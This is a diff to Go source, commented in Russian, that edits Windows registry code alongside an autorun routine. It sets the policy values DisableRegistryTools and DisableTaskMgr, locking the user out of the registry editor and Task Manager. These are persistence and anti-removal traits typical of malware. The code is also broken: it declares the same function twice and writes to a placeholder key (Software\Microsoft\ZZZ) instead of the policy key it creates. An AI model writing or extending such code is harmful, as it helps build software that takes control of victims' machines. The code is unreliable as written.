@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"golang.org/x/sys/windows/registry"
 	"log"
+	"os"
+	"path/filepath"
 )
 
 func AddAutorun() {
@@ -27,9 +29,9 @@ func AddAutorun() {
 	}
 }
 
-// Cоздание sub_key System (по умолчанию его нет), на этоп этапе нужно права администратора...
+// Cоздание sub_key System (по умолчанию его нет), на этоп этапе нужны права администратора...
 func create(){
-	k, b, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\`, uint32(0xf003f))
+	k, b, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, uint32(0xf003f))
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -40,13 +42,26 @@ func create(){
 	fmt.Println(b)
 }
 
-// Блокировка доступа в встроенному редактору реестра
+// Блокировка доступа ко встроенному редактору реестра
 func blockreestr() {
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\ZZZ`, registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
 		log.Fatal(err)
 	}
-	if err := k.SetDWordValue("Di", uint32(1)); err != nil {
+	if err := k.SetDWordValue("DisableRegistryTools", uint32(1)); err != nil {  // Имя ключа как в статье на хабре
+		log.Fatal(err)
+	}
+	if err := k.Close(); err != nil {
+		log.Fatal(err)
+	}
+}
+// Блокировка доступа к диспетчеру задач
+func blockreestr() {
+	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\ZZZ`, registry.QUERY_VALUE|registry.SET_VALUE)
+	if err != nil {
+		log.Fatal(err)
+	}
+	if err := k.SetDWordValue("DisableTaskMgr", uint32(1)); err != nil {  // Имя ключа как в статье на хабре
 		log.Fatal(err)
 	}
 	if err := k.Close(); err != nil {
